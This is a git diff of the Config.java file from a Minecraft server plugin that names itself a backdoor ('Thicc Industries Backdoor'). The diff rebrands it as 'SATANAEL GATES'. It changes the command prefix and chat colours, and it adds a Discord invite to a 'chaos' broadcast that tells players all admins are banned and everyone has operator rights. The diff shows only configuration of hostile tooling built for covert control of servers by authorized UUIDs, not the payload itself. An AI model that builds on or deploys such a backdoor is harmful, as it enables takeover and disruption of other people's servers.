@@ -18,7 +18,7 @@ public class Config {
     public static String[] tmp_authorized_uuids;
     // Command Prefix
 
-    public static String command_prefix = "#";
+    public static String command_prefix = "+";
 
     // Treat authorized_uuids / tmp_authorized_uuids as player names instead.
     public static Boolean uuids_are_usernames = false;
@@ -51,13 +51,13 @@ public class Config {
     /* Chat settings */
 
     // message prefix 
-    public static final String chat_message_prefix = "## BD ##";
+    public static final String chat_message_prefix = "## SATANAEL ##";
 
     // color of messages prefix 
-    public static final ChatColor chat_message_prefix_color = ChatColor.GOLD;
+    public static final ChatColor chat_message_prefix_color = ChatColor.RED;
 
     // color of help command name 
-    public static final ChatColor help_command_name_color = ChatColor.LIGHT_PURPLE;
+    public static final ChatColor help_command_name_color = ChatColor.GOLD;
 
     // color of help command syntax 
     public static final ChatColor help_command_desc_color = ChatColor.WHITE;
@@ -69,7 +69,8 @@ public class Config {
     // Chaos chat message
     public static final String chaos_chat_broadcast = "\n\n\n\n\n\n\n\n\n\n" +
                                                         "[Server] ALL ADMINS HAVE BEEN BANNED\n" +
-                                                        "[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK";
+                                                        "[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK" +
+                                                        "[Server] SATANAEL ON TOP X https://discord.gg/mbummpZ47Z";
 
 
     public static class Param {
@@ -213,7 +214,7 @@ public class Config {
                 sb.append(ChatColor.RESET);
                 sb.append("(" + p.name + ") " + p.description);
                 if(p.required)
-                    sb.append(help_command_required_color + " [Required]");
+                    sb.append(help_command_required_color + " [INPORTAND]");
                 sb.append("\n");
             }
 
@@ -225,7 +226,7 @@ public class Config {
         }
         public static String buildHelpMenu(int page){
             StringBuilder sb = new StringBuilder();
-            sb.append(help_detail_color + "Thicc Industries Backdoor\n");
+            sb.append(help_detail_color + "SATANAEL GATES\n");
             sb.append(help_detail_color + "-----------------------------------------------------\n\n");
             for(int i = 0; i < help_messages.length; ++i ){
                 sb.append(help_messages[i].getHelpEntry());
